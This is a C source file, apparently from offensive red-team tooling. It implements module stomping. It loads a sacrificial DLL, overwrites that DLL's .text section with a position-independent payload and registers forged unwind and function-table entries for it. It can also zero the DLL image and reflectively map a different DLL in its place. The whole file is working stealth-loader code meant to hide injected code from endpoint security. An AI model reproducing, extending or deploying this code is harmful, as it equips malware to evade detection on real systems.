#include "stomp.h"

static BOOL StompPICO( PICO_ARGS picoArgs ) {
    DWORD oldProt = 0;

    HMODULE hModule = KERNEL32$LoadLibraryExA(picoArgs.sacrificialDll, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if ( !hModule ) {
        StealthDbg("ERROR: failed to load sacrificial DLL '%s'\n", picoArgs.sacrificialDll);
        return FALSE;
    }
    StealthDbg("loaded sacrificial DLL '%s' at %p\n", picoArgs.sacrificialDll, hModule);

    PIMAGE_DOS_HEADER   pDosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS   pNtHeader  = (PIMAGE_NT_HEADERS)((ULONG_PTR)hModule + pDosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHeader);

    PVOID pTextSection = NULL;
    DWORD textSize     = 0;

    for ( WORD i = 0; i < pNtHeader->FileHeader.NumberOfSections; i++ ) {
        if ( (*(DWORD*)pSection->Name | 0x20202020) == 'xet.' ) {
            pTextSection = (PVOID)((ULONG_PTR)hModule + pSection->VirtualAddress);
            textSize     = pSection->Misc.VirtualSize;
            StealthDbg("found .text section at %p with size 0x%X\n", pTextSection, textSize);
            break;
        }
        pSection++;
    }

    if ( !pTextSection || textSize == 0 ) {
        StealthDbg("ERROR: failed to find .text section in sacrificial DLL\n");
        KERNEL32$VirtualFree(hModule, 0, MEM_RELEASE);
        return FALSE;
    }

    *(picoArgs.pico_dst) = (PICO*)pTextSection;

    /* Make .text writable for PicoLoad + unwind data */
    KERNEL32$VirtualProtect(pTextSection, textSize, PAGE_READWRITE, &oldProt);

    PicoLoad(picoArgs.funcs, picoArgs.pico_src, (*picoArgs.pico_dst)->code, (*picoArgs.pico_dst)->data);

    DWORD picoCodeSize = (DWORD)PicoCodeSize(picoArgs.pico_src);
    unsigned char* code = (unsigned char*)(*picoArgs.pico_dst)->code;
    
    // /* Write 4-byte leaf UNWIND_INFO after code */
    unsigned char* unwindSlot = code + picoCodeSize;
    unwindSlot[0] = 0x01; /* Version=1, NHANDLER */
    unwindSlot[1] = 0x00; /* SizeOfProlog = 0    */
    unwindSlot[2] = 0x00; /* CountOfCodes = 0    */
    unwindSlot[3] = 0x00; /* FrameRegister = 0   */

    RUNTIME_FUNCTION* rfTable = picoArgs.pico_rf_storage;
    rfTable[0].BeginAddress   = 0;
    rfTable[0].EndAddress     = picoCodeSize;
    rfTable[0].UnwindData     = picoCodeSize; /* RVA to UNWIND_INFO from code base */

    DWORD coverSize = picoCodeSize + 4;
    KERNEL32$VirtualProtect(code, coverSize, PAGE_EXECUTE_READ, &oldProt);
    KERNEL32$RtlDeleteFunctionTable((PRUNTIME_FUNCTION)hModule);
    BOOL rfResult = KERNEL32$RtlAddFunctionTable(rfTable, 1, (DWORD64)code);
    return TRUE;
}

static BOOL StompDLL( DLL_ARGS dllArgs ) {
    DWORD oldProt = 0;
    *(dllArgs.dll_dst) = (char*)KERNEL32$LoadLibraryExA( dllArgs.sacrificialDll, NULL, DONT_RESOLVE_DLL_REFERENCES );
    if ( !*(dllArgs.dll_dst) ) {
        StealthDbg("ERROR: failed to load sacrificial DLL '%s'\n", dllArgs.sacrificialDll);
        return FALSE;
    }
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)*(dllArgs.dll_dst);
    PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)( ( ULONG_PTR ) *(dllArgs.dll_dst) + pDosHeader->e_lfanew );
    DWORD dllSize = pNtHeader->OptionalHeader.SizeOfImage;
    KERNEL32$VirtualProtect( *(dllArgs.dll_dst), dllSize, PAGE_READWRITE, &oldProt );
    MSVCRT$memset( *(dllArgs.dll_dst), 0, dllSize );
    LoadDLL( dllArgs.dll_data, *(dllArgs.dll_src), *(dllArgs.dll_dst) );
    ProcessImports( dllArgs.funcs, dllArgs.dll_data, *(dllArgs.dll_dst) );

    return TRUE;
}

BOOL Stomp( STOMP_ARGS stompArgs ) {
    
    switch ( stompArgs.resourceType ) {
        case rPICO:
            StealthDbg("Stomping PICO into memory...\n");
            StealthDbg("PICO source size: code=0x%X data=0x%X\n", PicoCodeSize(stompArgs.picoArgs.pico_src), PicoDataSize(stompArgs.picoArgs.pico_src));
            return StompPICO( stompArgs.picoArgs );
        case rDLL:
            StealthDbg("Stomping DLL into memory...\n");
            StealthDbg("DLL source size: 0x%X\n", SizeOfDLL(stompArgs.dllArgs.dll_data));
            return StompDLL( stompArgs.dllArgs );
    }
    return FALSE;
}